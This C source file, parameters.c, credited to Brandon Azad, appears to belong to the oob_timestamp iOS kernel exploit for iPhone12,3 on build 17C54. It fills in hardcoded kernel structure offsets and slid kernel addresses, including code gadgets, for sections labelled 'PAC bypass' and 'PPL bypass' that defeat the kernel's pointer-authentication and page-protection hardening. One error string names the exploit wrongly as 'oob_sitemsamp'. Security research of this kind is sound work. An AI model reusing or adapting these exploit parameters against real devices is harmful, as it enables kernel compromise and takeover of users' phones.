/*
 * parameters.c
 * Brandon Azad
 */
#define PARAMETERS_EXTERN PARAMETER_SHARED
#include "parameters.h"

#include "kernel.h"
#include "log.h"
#include "platform.h"
#include "platform_match.h"


// Get the number of elements in a static array.
#define ARRAY_COUNT(x)	(sizeof(x) / sizeof((x)[0]))

// Slide a static kernel address.
#define SLIDE(_addr)	(_addr + kernel_slide)

// ---- oob_timestamp parameters ------------------------------------------------------------------

// oob_timestamp initialization for iPhone12,3 17C54.
static void
oob_timestamp_offsets__iphone12_3__17C54() {
	OFFSET(host, special) = 0x10;

	SIZE(ipc_entry)              = 0x18;
	OFFSET(ipc_entry, ie_object) =  0x0;
	OFFSET(ipc_entry, ie_bits)   =  0x8;

	OFFSET(ipc_port, ip_bits)       =  0x0;
	OFFSET(ipc_port, ip_references) =  0x4;
	OFFSET(ipc_port, ip_receiver)   = 0x60;
	OFFSET(ipc_port, ip_kobject)    = 0x68;
	OFFSET(ipc_port, ip_mscount)    = 0x9c;
	OFFSET(ipc_port, ip_srights)    = 0xa0;

	OFFSET(ipc_space, is_table_size) = 0x14;
	OFFSET(ipc_space, is_table)      = 0x20;
	OFFSET(ipc_space, is_task)       = 0x28;

	OFFSET(proc, p_list_next) =  0x0;
	OFFSET(proc, p_list_prev) =  0x8;
	OFFSET(proc, task)        = 0x10;
	OFFSET(proc, p_pid)       = 0x68;

	OFFSET(task, lck_mtx_data)        =   0x0;
	OFFSET(task, lck_mtx_type)        =   0xb;
	OFFSET(task, ref_count)           =  0x10;
	OFFSET(task, active)              =  0x14;
	OFFSET(task, map)                 =  0x28;
	OFFSET(task, itk_sself)           = 0x108;
	OFFSET(task, itk_space)           = 0x320;
	OFFSET(task, bsd_info)            = 0x388;
	OFFSET(task, all_image_info_addr) = 0x3d0;
	OFFSET(task, all_image_info_size) = 0x3d8;

	OFFSET(IOSurface, properties) = 0xe8;

	OFFSET(IOSurfaceClient, surface) = 0x40;

	OFFSET(IOSurfaceRootUserClient, surfaceClients) = 0x118;

	OFFSET(OSArray, count) = 0x14;
	OFFSET(OSArray, array) = 0x20;

	OFFSET(OSData, capacity) = 0x10;
	OFFSET(OSData, data)     = 0x18;

	OFFSET(OSDictionary, count)      = 0x14;
	OFFSET(OSDictionary, dictionary) = 0x20;

	OFFSET(OSString, string) = 0x10;
}

// A list of offset initializations by platform.
static const struct platform_initialization oob_timestamp_offsets[] = {
	{ "iPhone12,3", "17C54", oob_timestamp_offsets__iphone12_3__17C54 },
};

bool
oob_timestamp_parameters_init() {
	// Only initialize once.
	static bool initialized = false;
	if (initialized) {
		return true;
	}
	// Initialize offsets.
	size_t count = platform_initializations_run(oob_timestamp_offsets,
			ARRAY_COUNT(oob_timestamp_offsets));
	if (count < 1) {
		ERROR("No %s offsets for %s %s", "oob_sitemsamp",
				platform.machine, platform.osversion);
		return false;
	}
	initialized = true;
	return true;
}

// ---- kernel parameters -------------------------------------------------------------------------

// Kernel parameter initialization for iPhone12,3 17C54.
static void
kernel_parameters__iphone12_3__17C54() {
	SIZE(ipc_entry)              = 0x18;
	OFFSET(ipc_entry, ie_object) =  0x0;

	OFFSET(ipc_port, ip_kobject) = 0x68;

	OFFSET(ipc_space, is_table_size) = 0x14;
	OFFSET(ipc_space, is_table)      = 0x20;

	OFFSET(proc, p_list_prev) =  0x8;
	OFFSET(proc, task)        = 0x10;
	OFFSET(proc, p_pid)       = 0x68;

	OFFSET(task, itk_space) = 0x320;
}

static void
kernel_parameters__common() {
	STATIC_ADDRESS(kernel_base) = 0xfffffff007004000;
}

// A list of kernel parameter initializations by platform.
static const struct platform_initialization kernel_parameters[] = {
	{ "iPhone12,3", "17C54", kernel_parameters__iphone12_3__17C54 },
	{ "*",          "*",     kernel_parameters__common            },
};

bool
kernel_parameters_init() {
	// Only initialize once.
	static bool initialized = false;
	if (initialized) {
		return true;
	}
	// Initialize offsets.
	size_t count = platform_initializations_run(kernel_parameters,
			ARRAY_COUNT(kernel_parameters));
	if (count < 2) {
		ERROR("No %s parameters for %s %s", "kernel",
				platform.machine, platform.osversion);
		return false;
	}
	initialized = true;
	return true;
}

// ---- PAC bypass parameters ---------------------------------------------------------------------

// PAC bypass parameter initialization for iPhone12,3 17C54.
static void
pac_bypass_parameters__iphone12_3__17C54() {
	OFFSET(cpu_data, cpu_number)    =  0x0;
	OFFSET(cpu_data, cpu_processor) = 0x68;
	OFFSET(cpu_data, cpu_int_state) = 0xf8;

	SIZE(cpu_data_entry) = 0x10;
	OFFSET(cpu_data_entry, cpu_data_vaddr) = 0x8;

	OFFSET(thread, bound_processor) = 0x1a0;
	OFFSET(thread, contextData)     = 0x448;
	OFFSET(thread, CpuDatap)        = 0x490;

	ADDRESS(CpuDataEntries)                       = SLIDE(0xFFFFFFF009400A38);
	ADDRESS(thread_set_state__preemption_point_1) = SLIDE(0xFFFFFFF007CD0C70);
	ADDRESS(thread_set_state__preemption_point_2) = SLIDE(0xFFFFFFF007CD0D5C);
	ADDRESS(spinning_gadget)                      = SLIDE(0xFFFFFFF007CCFF20);
	ADDRESS(signing_gadget)                       = SLIDE(0xFFFFFFF007CD29A0);
	ADDRESS(signing_gadget_end)                   = SLIDE(0xFFFFFFF007CD29B0);
	ADDRESS(thread_set_state__preemption_resume)  = SLIDE(0xFFFFFFF007CD1F3C);
	ADDRESS(ml_sign_thread_state)                 = SLIDE(0xFFFFFFF0081C591C);
	ADDRESS(exception_return)                     = SLIDE(0xFFFFFFF0081BF8EC);
	ADDRESS(BR_X25)                               = SLIDE(0xFFFFFFF0081BFC94);
	ADDRESS(STR_X9_X3__STR_X8_X4__RET)            = SLIDE(0xFFFFFFF008F7A290);
	ADDRESS(memmove)                              = SLIDE(0xFFFFFFF0081BD4D0);
	ADDRESS(exception_return__unsigned)           = SLIDE(0xFFFFFFF0081BF938);
	ADDRESS(pthread_returning_to_userspace)       = SLIDE(0xFFFFFFF007F77FBC);
	ADDRESS(STR_X0_X20__LDP_X29_X30_SP_10__RETAB) = SLIDE(0xFFFFFFF008E65780);
}

// A list of PAC bypass parameter initializations by platform.
static const struct platform_initialization pac_bypass_parameters[] = {
	{ "iPhone12,3", "17C54", pac_bypass_parameters__iphone12_3__17C54 },
};

bool
pac_bypass_parameters_init() {
	// Only initialize once.
	static bool initialized = false;
	if (initialized) {
		return true;
	}
	// Initialize offsets.
	size_t count = platform_initializations_run(pac_bypass_parameters,
			ARRAY_COUNT(pac_bypass_parameters));
	if (count < 1) {
		ERROR("No %s parameters for %s %s", "PAC bypass",
				platform.machine, platform.osversion);
		return false;
	}
	initialized = true;
	return true;
}

// ---- PPL bypass parameters ---------------------------------------------------------------------

// PPL bypass parameter initialization for iPhone12,3 17C54.
static void
ppl_bypass_parameters__iphone12_3__17C54() {
	OFFSET(cpu_data, cpu_processor) = 0x68;

	SIZE(cpu_data_entry) = 0x10;
	OFFSET(cpu_data_entry, cpu_data_vaddr) = 0x8;

	OFFSET(pmap, ttep) = 0x8;

	OFFSET(task, map) = 0x28;

	OFFSET(thread, bound_processor) = 0x1a0;
	OFFSET(thread, CpuDatap)        = 0x490;

	OFFSET(vm_map, pmap) = 0x48;

	SIZE(vm_page) = 0x30;
	OFFSET(vm_page, vmp_q_snext)   = 0x00;
	OFFSET(vm_page, vmp_phys_page) = 0x30;

	ADDRESS(CpuDataEntries)                = SLIDE(0xFFFFFFF009400A38);
	ADDRESS(cpu_ttep)                      = SLIDE(0xFFFFFFF0078CA950);
	ADDRESS(gPhysBase)                     = SLIDE(0xFFFFFFF0078CAF40);
	ADDRESS(gVirtBase)                     = SLIDE(0xFFFFFFF0078CAF48);
	ADDRESS(ptov_table)                    = SLIDE(0xFFFFFFF0078CB0E8);
	ADDRESS(vm_page_array_beginning_addr)  = SLIDE(0xFFFFFFF0093FFC70);
	ADDRESS(vm_page_array_ending_addr)     = SLIDE(0xFFFFFFF0093FC510);
	ADDRESS(vm_first_phys_ppnum)           = SLIDE(0xFFFFFFF0093FFC68);
	ADDRESS(ppl_page_count)                = SLIDE(0xFFFFFFF00923C198);
	ADDRESS(cpm_allocate)                  = SLIDE(0xFFFFFFF007C8903C);
	ADDRESS(pmap_mark_page_as_ppl_page)    = SLIDE(0xFFFFFFF007B800F0);
	ADDRESS(pmap_mark_page_as_kernel_page) = SLIDE(0xFFFFFFF007B80118);
	ADDRESS(pmap_alloc_page_for_kern)      = SLIDE(0xFFFFFFF007CBA144);
	ADDRESS(pmap_remove_options)           = SLIDE(0xFFFFFFF007B800A0);
}

// A list of PPL bypass parameter initializations by platform.
static const struct platform_initialization ppl_bypass_parameters[] = {
	{ "iPhone12,3", "17C54", ppl_bypass_parameters__iphone12_3__17C54 },
};

bool
ppl_bypass_parameters_init() {
	// Only initialize once.
	static bool initialized = false;
	if (initialized) {
		return true;
	}
	// Initialize offsets.
	size_t count = platform_initializations_run(ppl_bypass_parameters,
			ARRAY_COUNT(ppl_bypass_parameters));
	if (count < 1) {
		ERROR("No %s parameters for %s %s", "PPL bypass",
				platform.machine, platform.osversion);
		return false;
	}
	initialized = true;
	return true;
}
